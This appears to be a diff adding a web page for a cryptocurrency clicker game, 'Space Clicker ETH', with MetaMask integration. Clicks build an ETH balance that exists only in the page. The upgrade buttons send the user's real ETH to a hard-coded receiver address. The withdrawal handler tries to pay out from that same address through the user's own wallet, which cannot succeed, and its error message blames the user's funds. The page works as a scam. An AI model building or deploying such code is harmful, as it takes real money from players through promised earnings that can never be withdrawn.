@@ -1,0 +1,448 @@
+<html><head><base href="/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Space Clicker ETH</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(white, rgba(255,255,255,0) 2px);
+            background-size: 50px 50px;
+            animation: stars 20s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes stars {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(100%);
+            }
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            margin: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+        }
+
+        h1 {
+            text-shadow: 0 0 10px #00ff9d;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+        }
+
+        .wallet-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 15px;
+            margin: 10px 0;
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            display: none;
+        }
+
+        .spaceship {
+            cursor: pointer;
+            transition: transform 0.1s;
+            margin: 20px 0;
+            filter: drop-shadow(0 0 10px rgba(0, 255, 157, 0.5));
+        }
+
+        .spaceship:hover {
+            filter: drop-shadow(0 0 15px rgba(0, 255, 157, 0.8));
+        }
+
+        .counter, .eth-counter {
+            font-size: 24px;
+            margin: 20px 0;
+            text-shadow: 0 0 5px currentColor;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .counter { color: #00ff9d; }
+        .eth-counter { color: #7cb9e8; }
+
+        .button-container {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .connect-wallet, .upgrades-btn {
+            padding: 15px 30px;
+            border-radius: 25px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .connect-wallet {
+            background: linear-gradient(45deg, #6ab7ff, #4361ee);
+        }
+
+        .upgrades-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ee4343);
+        }
+
+        .connect-wallet:hover, .upgrades-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+
+        .withdraw-btn {
+            background: linear-gradient(45deg, #00ff9d, #00bf8f);
+            padding: 12px 25px;
+            border-radius: 25px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: block;
+            margin: 10px auto;
+        }
+
+        .withdraw-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+        }
+
+        .modal-content {
+            background: rgba(0, 0, 0, 0.8);
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #00ff9d;
+            width: 80%;
+            max-width: 500px;
+            border-radius: 15px;
+            color: white;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .upgrade-item {
+            background: rgba(0, 0, 0, 0.5);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .upgrade-item:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
+        }
+
+        .buy-btn {
+            background: linear-gradient(45deg, #00ff9d, #00bf8f);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .buy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+
+        .clicks-limit {
+            color: #ff6b6b;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Space Clicker ETH</h1>
+        <div class="counter">Clicks: <span id="clickCount">0</span></div>
+        <div class="eth-counter">ETH: <span id="ethCount">0.00000</span></div>
+        <div class="wallet-info" id="walletInfo">Wallet: <span id="walletAddress">Not Connected</span></div>
+        <div class="clicks-limit">Clicks remaining this hour: <span id="clicksRemaining">60</span></div>
+        
+        <svg class="spaceship" width="200" height="200" viewBox="0 0 200 200" id="clickerShip">
+            <defs>
+                <linearGradient id="shipGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" style="stop-color:#4361ee" />
+                    <stop offset="100%" style="stop-color:#3498db" />
+                </linearGradient>
+                <filter id="glow">
+                    <feGaussianBlur stdDeviation="2" result="coloredBlur"/>
+                    <feMerge>
+                        <feMergeNode in="coloredBlur"/>
+                        <feMergeNode in="SourceGraphic"/>
+                    </feMerge>
+                </filter>
+            </defs>
+            <path d="M100 50 L150 150 L100 130 L50 150 Z" fill="url(#shipGradient)" stroke="#00ff9d" stroke-width="2" filter="url(#glow)"/>
+            <circle cx="100" cy="90" r="10" fill="#00ff9d"/>
+            <path d="M70 140 L130 140" stroke="#ff6b6b" stroke-width="4"/>
+            <circle cx="100" cy="90" r="15" fill="transparent" stroke="#00ff9d" stroke-width="2">
+                <animate attributeName="r" values="15;20;15" dur="2s" repeatCount="indefinite"/>
+                <animate attributeName="opacity" values="1;0;1" dur="2s" repeatCount="indefinite"/>
+            </circle>
+        </svg>
+
+        <div class="button-container">
+            <button class="connect-wallet" id="connectWallet">Connect Metamask</button>
+            <button class="upgrades-btn" id="upgradesBtn">Upgrades</button>
+        </div>
+        
+        <button class="withdraw-btn" id="withdrawBtn">Withdraw ETH</button>
+    </div>
+
+    <div id="upgradesModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Available Upgrades</h2>
+            <div class="upgrade-item">
+                <h3>Double Click Speed (x2)</h3>
+                <p>Cost: 0.005 ETH</p>
+                <p>Doubles your clicks per hour limit</p>
+                <button class="buy-btn" id="buyDouble">Buy Upgrade</button>
+            </div>
+            <div class="upgrade-item">
+                <h3>Quadruple Click Speed (x4)</h3>
+                <p>Cost: 0.01 ETH</p>
+                <p>Quadruples your clicks per hour limit</p>
+                <button class="buy-btn" id="buyQuad">Buy Upgrade</button>
+            </div>
+        </div>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+<script>
+    // Initialize variables
+    let clicks = 0;
+    let eth = 0;
+    let clicksRemaining = 60;
+    let maxClicksPerHour = 60;
+    let web3;
+    let userAccount;
+    
+    const ethPerClick = 0.00001;
+    const RECEIVER_ADDRESS = '0x180A3a1AF44365c63418C09250FC51fb3523EE96';
+    const clickSound = new Audio('https://www.soundjay.com/button/sounds/button-09.mp3');
+
+    // DOM Elements
+    const clickCount = document.getElementById('clickCount');
+    const ethCount = document.getElementById('ethCount');
+    const walletInfo = document.getElementById('walletInfo');
+    const walletAddress = document.getElementById('walletAddress');
+    const spaceship = document.getElementById('clickerShip');
+    const modal = document.getElementById('upgradesModal');
+    const upgradesBtn = document.getElementById('upgradesBtn');
+    const closeBtn = document.getElementsByClassName('close')[0];
+    const connectWalletBtn = document.getElementById('connectWallet');
+    const clicksRemainingElement = document.getElementById('clicksRemaining');
+
+    // Reset clicks every hour
+    setInterval(() => {
+        clicksRemaining = maxClicksPerHour;
+        clicksRemainingElement.textContent = clicksRemaining;
+    }, 3600000);
+
+    // Click handler
+    spaceship.addEventListener('click', () => {
+        if (clicksRemaining > 0) {
+            clicks++;
+            eth += ethPerClick;
+            clickCount.textContent = clicks;
+            ethCount.textContent = eth.toFixed(5);
+            clicksRemaining--;
+            clicksRemainingElement.textContent = clicksRemaining;
+            clickSound.play();
+            
+            spaceship.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                spaceship.style.transform = 'scale(1)';
+            }, 100);
+        }
+    });
+
+    // Modal handlers
+    upgradesBtn.onclick = () => modal.style.display = "block";
+    closeBtn.onclick = () => modal.style.display = "none";
+    window.onclick = (event) => {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    };
+
+    // Metamask connection
+    connectWalletBtn.addEventListener('click', async () => {
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                web3 = new Web3(window.ethereum);
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                
+                walletInfo.style.display = 'block';
+                walletAddress.textContent = userAccount.slice(0, 6) + '...' + userAccount.slice(-4);
+                
+                connectWalletBtn.textContent = 'Connected!';
+                connectWalletBtn.style.background = 'linear-gradient(45deg, #00ff9d, #00bf8f)';
+            } catch (error) {
+                console.error(error);
+                alert('Failed to connect to Metamask');
+            }
+        } else {
+            alert('Please install Metamask!');
+        }
+    });
+
+    // Transaction helper function
+    async function sendTransaction(amount) {
+        if (!userAccount) {
+            alert('Please connect your wallet first!');
+            return false;
+        }
+
+        try {
+            const amountWei = web3.utils.toWei(amount.toString(), 'ether');
+            await web3.eth.sendTransaction({
+                from: userAccount,
+                to: RECEIVER_ADDRESS,
+                value: amountWei
+            });
+            return true;
+        } catch (error) {
+            console.error(error);
+            alert('Transaction failed!');
+            return false;
+        }
+    }
+
+    // Withdrawal handler
+    document.getElementById('withdrawBtn').addEventListener('click', async () => {
+        if (!userAccount) {
+            alert('Please connect your wallet first!');
+            return;
+        }
+        
+        if (eth <= 0) {
+            alert('No ETH available to withdraw!');
+            return;
+        }
+
+        try {
+            const amountWei = web3.utils.toWei(eth.toString(), 'ether');
+            await web3.eth.sendTransaction({
+                from: RECEIVER_ADDRESS,
+                to: userAccount,
+                value: amountWei
+            });
+            
+            // Reset ETH count after successful withdrawal
+            eth = 0;
+            ethCount.textContent = eth.toFixed(5);
+            alert('Withdrawal successful!');
+        } catch (error) {
+            console.error(error);
+            alert('Withdrawal failed! Make sure you have enough funds and try again.');
+        }
+    });
+
+    // Upgrade handlers
+    document.getElementById('buyDouble').addEventListener('click', async () => {
+        if (await sendTransaction(0.005)) {
+            maxClicksPerHour *= 2;
+            clicksRemaining = maxClicksPerHour;
+            clicksRemainingElement.textContent = clicksRemaining;
+            alert('Upgrade successful! Your clicks per hour limit is now ' + maxClicksPerHour);
+        }
+    });
+
+    document.getElementById('buyQuad').addEventListener('click', async () => {
+        if (await sendTransaction(0.01)) {
+            maxClicksPerHour *= 4;
+            clicksRemaining = maxClicksPerHour;
+            clicksRemainingElement.textContent = clicksRemaining;
+            alert('Upgrade successful! Your clicks per hour limit is now ' + maxClicksPerHour);
+        }
+    });
+
+    // Stars background
+    function createStars() {
+        const stars = 200;
+        const container = document.createElement('div');
+        container.style.position = 'fixed';
+        container.style.width = '100%';
+        container.style.height = '100%';
+        container.style.zIndex = '-2';
+        
+        for (let i = 0; i < stars; i++) {
+            const star = document.createElement('div');
+            star.style.position = 'absolute';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = '2px';
+            star.style.height = '2px';
+            star.style.background = 'white';
+            star.style.borderRadius = '50%';
+            container.appendChild(star);
+        }
+        
+        document.body.appendChild(container);
+    }
+
+    createStars();
+</script>
+</body></html>
